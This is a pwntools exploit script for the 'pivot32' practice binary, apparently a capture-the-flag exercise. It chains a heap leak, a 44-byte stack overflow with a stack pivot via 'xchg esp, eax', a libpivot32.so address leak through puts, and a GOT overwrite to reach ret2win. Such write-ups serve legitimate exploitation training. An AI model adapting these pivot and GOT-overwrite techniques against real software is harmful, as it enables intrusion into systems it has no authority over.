#!/usr/bin/env python3
# I truly overcomplicated this because I didn't use some "usefulGadgets"
from pwn import *

elf = ELF("./pivot32")
lib = ELF("./libpivot32.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

io = process("./pivot32")

pop_eax = 0x0804882c          # pop eax ; ret
xchg_esp_eax = 0x0804882e     # xchg esp, eax ; ret
pop_esi_edi_ebp = 0x08048899  # pop esi ; pop edi ; pop ebp ; ret

### ROP chain

# Leak heap address
io.recvuntil(b"pivot: ")
heap_addr = int(io.recvline().strip(), 16)
log.info(f"ROP address leak: {hex(heap_addr)}")

# Leak libpivot32.so address
rop_chain = p32(elf.plt.foothold_function)
rop_chain += p32(elf.plt.puts)
rop_chain += p32(pop_eax)
rop_chain += p32(elf.got.foothold_function)

# Overwrite got.puts with ret2win
rop_chain += p32(elf.sym.read) # read 
rop_chain += p32(pop_esi_edi_ebp)
rop_chain += p32(0)            
rop_chain += p32(elf.got.puts)
rop_chain += p32(4)
rop_chain += p32(elf.plt.puts)  

io.send(rop_chain)

# Stack smash
pivot_payload = b"A" * 44
pivot_payload += p32(pop_eax) + p32(heap_addr)
pivot_payload += p32(xchg_esp_eax)
io.send(pivot_payload)

# Leak lib.so
io.recvuntil(b"libpivot\n")
leak = u32(io.recvline().strip())
log.info(f"foothold address leak: {hex(leak)}")

# Calculate ret2win
lib.address = leak - lib.sym.foothold_function 
log.info(f"retwin address: {hex(lib.sym.ret2win)}")

# Overwrite got.puts with ret2win
io.sendline(p32(lib.sym.ret2win))
print(io.recv())
